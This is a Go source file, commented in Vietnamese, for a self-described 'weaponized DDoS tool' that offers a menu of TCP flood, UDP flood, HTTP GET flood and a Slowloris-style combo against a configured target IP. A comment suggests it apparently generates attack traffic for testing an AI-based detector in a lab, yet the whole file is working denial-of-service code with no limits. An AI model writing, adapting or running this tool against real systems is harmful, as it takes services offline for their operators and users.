package main

import (
	"crypto/rand"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

// === CẤU HÌNH MỤC TIÊU ===
const (
	TargetIP   = "10.203.152.105" // Đổi IP này thành IP máy Ubuntu
	TargetPort = "80"
	NumWorkers = 1500 // Đủ mạnh để AI detect, không lag máy mình
)

func tcpFlood(wg *sync.WaitGroup) {
	defer wg.Done()
	target := net.JoinHostPort(TargetIP, TargetPort)
	payload := []byte("Garbage Data Go")

	for {
		conn, err := net.DialTimeout("tcp", target, 2*time.Second)
		if err == nil {
			conn.Write(payload)
			conn.Close()
		}
	}
}

func udpFlood(wg *sync.WaitGroup) {
	defer wg.Done()
	target := net.JoinHostPort(TargetIP, "80")
	conn, err := net.Dial("udp", target)
	if err != nil {
		return
	}
	defer conn.Close()

	payload := make([]byte, 1024)
	rand.Read(payload)

	for {
		conn.Write(payload)
	}
}

func httpFlood(wg *sync.WaitGroup) {
	defer wg.Done()
	defer func() { recover() }()

	client := &http.Client{
		Timeout: 200 * time.Millisecond, // Ultra-short: retry 10x nhanh hơn
		Transport: &http.Transport{
			DisableKeepAlives:   true,
			MaxIdleConnsPerHost: 0,
		},
	}
	url := "http://" + TargetIP

	for {
		resp, err := client.Get(url)
		if err != nil {
			continue // Không nghỉ, bắn tiếp ngay
		}
		resp.Body.Close()
	}
}

// slowConnect giữ connection mở lâu nhất có thể để cạn kiệt slot NGINX.
func slowConnect(wg *sync.WaitGroup) {
	defer wg.Done()
	defer func() { recover() }()

	target := net.JoinHostPort(TargetIP, TargetPort)
	for {
		conn, err := net.DialTimeout("tcp", target, 500*time.Millisecond)
		if err != nil {
			continue
		}
		// Gửi header HTTP chậm rãi, giữ connection sống
		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + TargetIP + "\r\n"))
		time.Sleep(5 * time.Second) // Giữ connection 5 giây
		conn.Write([]byte("X-Pad: keep-alive\r\n"))
		time.Sleep(5 * time.Second) // Tiếp tục giữ
		conn.Close()
	}
}

func main() {
	fmt.Println("==================================================")
	fmt.Println("  [X] GOLANG WEAPONIZED DDoS TOOL - NO GIL LIMIT")
	fmt.Printf("  [Target] %s:%s | [Workers] %d\n", TargetIP, TargetPort, NumWorkers)
	fmt.Println("==================================================")
	fmt.Println("[1] TCP SYN/Flood (Connection Exhaustion)")
	fmt.Println("[2] UDP Volumetric Flood")
	fmt.Println("[3] HTTP GET Flood (L7 Server Saturation)")
	fmt.Println("[4] HTTP + Slowloris Combo (Max Damage)")
	fmt.Println("==================================================")
	fmt.Print("Select attack type (1-4): ")

	var choice string
	fmt.Scanln(&choice)

	var wg sync.WaitGroup
	fmt.Printf("[*] Đang nạp đạn %d Goroutines...\n", NumWorkers)

	switch choice {
	case "1":
		fmt.Println("\n[!] Khai hỏa TCP Flood...")
		for i := 0; i < NumWorkers; i++ {
			wg.Add(1)
			go tcpFlood(&wg)
		}
	case "2":
		fmt.Println("\n[!] Khai hỏa UDP Flood...")
		for i := 0; i < NumWorkers; i++ {
			wg.Add(1)
			go udpFlood(&wg)
		}
	case "3":
		fmt.Println("\n[!] Khai hỏa HTTP GET Flood...")
		for i := 0; i < NumWorkers; i++ {
			wg.Add(1)
			go httpFlood(&wg)
		}
	case "4":
		fmt.Println("\n[!] Khai hỏa HTTP + Slowloris Combo...")
		// 70% HTTP Flood + 30% Slowloris giữ connection
		httpCount := NumWorkers * 7 / 10
		slowCount := NumWorkers - httpCount
		for i := 0; i < httpCount; i++ {
			wg.Add(1)
			go httpFlood(&wg)
		}
		for i := 0; i < slowCount; i++ {
			wg.Add(1)
			go slowConnect(&wg)
		}
	default:
		fmt.Println("Lựa chọn không hợp lệ, thoát.")
		os.Exit(1)
	}

	fmt.Println("[*] Đã phóng! Bấm Ctrl+C để dừng.")

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	fmt.Println("\n[!] Đã nhận lệnh ngừng bắn. Dừng tấn công.")
}

